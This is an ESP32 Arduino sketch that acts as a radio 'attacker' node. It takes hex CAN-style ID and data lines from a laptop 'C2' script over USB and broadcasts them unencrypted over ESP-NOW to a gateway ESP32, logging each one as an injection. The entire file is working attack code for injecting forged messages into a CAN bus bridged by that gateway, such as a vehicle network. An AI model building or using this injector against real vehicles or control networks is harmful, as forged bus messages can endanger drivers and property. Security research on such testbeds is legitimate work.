#include <WiFi.h>
#include <esp_now.h>

// Universal Broadcast Address - hits any listening node on the channel
uint8_t broadcastMac[] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};

// The exact structure the Gateway ESP32 is waiting for
typedef struct __attribute__((packed)) {
    uint32_t id;
    uint8_t dlc;
    uint8_t data[8];
} AttackPacket;

void setup() {
  Serial.begin(115200);
  
  // Set device as a Wi-Fi Station
  WiFi.mode(WIFI_STA);
  
  // Initialize ESP-NOW
  if (esp_now_init() != ESP_OK) {
    Serial.println("ESP-NOW Init Failed");
    return;
  }
  
  // Register the broadcast peer (ESP32 specific syntax)
  esp_now_peer_info_t peerInfo;
  memset(&peerInfo, 0, sizeof(peerInfo)); 
  memcpy(peerInfo.peer_addr, broadcastMac, 6);
  peerInfo.channel = 0;  
  peerInfo.encrypt = false;
  
  if (esp_now_add_peer(&peerInfo) != ESP_OK){
    Serial.println("Failed to add broadcast peer");
    return;
  }
  
  Serial.println("\n[ESP32 ATTACKER] Radio Armed. Waiting for C2 commands from Laptop...");
}

void loop() {
  // Listen for Python C2 script over USB
  if (Serial.available() > 0) {
    String input = Serial.readStringUntil('\n');
    input.trim();
    int colon = input.indexOf(':');
    
    if (colon != -1) {
      AttackPacket pkt;
      memset(&pkt, 0, sizeof(pkt)); // Clear payload
      
      String idStr = input.substring(0, colon);
      String dataStr = input.substring(colon + 1);
      
      // Parse Hex Strings into Bytes
      pkt.id = strtol(idStr.c_str(), NULL, 16);
      pkt.dlc = dataStr.length() / 2;
      if (pkt.dlc > 8) pkt.dlc = 8;
      
      for (int i = 0; i < pkt.dlc; i++) {
        String byteStr = dataStr.substring(i*2, i*2+2);
        pkt.data[i] = (uint8_t)strtol(byteStr.c_str(), NULL, 16);
      }
      
      // Fire the packet over the air
      esp_err_t result = esp_now_send(broadcastMac, (uint8_t *) &pkt, sizeof(pkt));
      if (result == ESP_OK) {
          Serial.print("[TX] Broadcast -> Injecting ID: 0x");
          Serial.println(pkt.id, HEX);
      } else {
          Serial.println("[TX] Radio transmission failed.");
      }
    }
  }
}